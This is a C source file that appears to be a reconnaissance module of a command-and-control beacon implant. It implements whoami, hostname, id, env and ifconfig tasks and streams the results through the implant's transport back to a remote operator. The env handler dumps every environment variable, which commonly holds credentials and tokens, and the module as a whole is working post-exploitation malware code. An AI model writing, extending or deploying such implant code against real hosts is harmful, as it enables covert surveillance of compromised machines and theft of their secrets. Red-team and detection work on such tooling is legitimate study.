// System information commands: whoami, hostname, id, env, ifconfig

#include "../core/beacon.h"
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <pwd.h>
#include <grp.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <errno.h>

extern char** environ;

// ---- whoami ----------------------------------------------------------------
void cmd_whoami(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);

    uid_t uid = getuid();
    struct passwd* pw = getpwuid(uid);
    if (pw && pw->pw_name) {
        out_write(pw->pw_name, strlen(pw->pw_name));
    } else {
        char buf[32];
        int n = snprintf(buf, sizeof(buf), "uid=%u", (unsigned)uid);
        out_write(buf, (size_t)n);
    }
    out_write("\n", 1);
}

// ---- hostname --------------------------------------------------------------
void cmd_hostname(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);
    char buf[256];
    if (gethostname(buf, sizeof(buf)) == 0) {
        out_write(buf, strlen(buf));
        out_write("\n", 1);
    } else {
        out_write("error: gethostname failed\n", 25);
    }
}

// ---- id (uid, gid, groups) -------------------------------------------------
void cmd_id(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);

    uid_t uid = getuid();
    gid_t gid = getgid();
    uid_t euid = geteuid();
    gid_t egid = getegid();

    struct passwd* pw = getpwuid(uid);
    struct group*  gr = getgrgid(gid);

    char line[512];
    int len = snprintf(line, sizeof(line), "uid=%u(%s) gid=%u(%s) euid=%u egid=%u",
                       (unsigned)uid,  pw && pw->pw_name ? pw->pw_name : "?",
                       (unsigned)gid,  gr && gr->gr_name ? gr->gr_name : "?",
                       (unsigned)euid, (unsigned)egid);
    if (len > 0) out_write(line, (size_t)len);

    // Supplementary groups
    gid_t groups[64];
    int ngroups = getgroups(64, groups);
    if (ngroups > 0) {
        out_write(" groups=", 8);
        for (int i = 0; i < ngroups; ++i) {
            struct group* sg = getgrgid(groups[i]);
            if (i > 0) out_write(",", 1);
            int n = snprintf(line, sizeof(line), "%u(%s)",
                             (unsigned)groups[i],
                             sg && sg->gr_name ? sg->gr_name : "?");
            if (n > 0) out_write(line, (size_t)n);
        }
    }
    out_write("\n", 1);
}

// ---- env -------------------------------------------------------------------
void cmd_env(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);

    if (!environ) {
        out_write("(empty)\n", 8);
        return;
    }
    for (char** e = environ; *e; ++e) {
        out_write(*e, strlen(*e));
        out_write("\n", 1);
        if (out_remaining() < 512) {
            out_flush_chunk(get_transport(), 0);
        }
    }
}

// ---- ifconfig (network interfaces) -----------------------------------------
void cmd_ifconfig(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);

    struct ifaddrs* ifa_list = NULL;
    if (getifaddrs(&ifa_list) != 0) {
        out_write("error: getifaddrs failed\n", 24);
        return;
    }

    for (struct ifaddrs* ifa = ifa_list; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr) continue;

        char line[256];
        int len = 0;

        if (ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in* sin = (struct sockaddr_in*)ifa->ifa_addr;
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &sin->sin_addr, ip, sizeof(ip));

            char mask[INET_ADDRSTRLEN] = "";
            if (ifa->ifa_netmask) {
                struct sockaddr_in* nm = (struct sockaddr_in*)ifa->ifa_netmask;
                inet_ntop(AF_INET, &nm->sin_addr, mask, sizeof(mask));
            }

            len = snprintf(line, sizeof(line), "%-12s inet  %-16s netmask %s\n",
                           ifa->ifa_name, ip, mask);
        } else if (ifa->ifa_addr->sa_family == AF_INET6) {
            struct sockaddr_in6* sin6 = (struct sockaddr_in6*)ifa->ifa_addr;
            char ip6[INET6_ADDRSTRLEN];
            inet_ntop(AF_INET6, &sin6->sin6_addr, ip6, sizeof(ip6));

            len = snprintf(line, sizeof(line), "%-12s inet6 %s\n",
                           ifa->ifa_name, ip6);
        }

        if (len > 0) out_write(line, (size_t)len);
    }
    freeifaddrs(ifa_list);
}
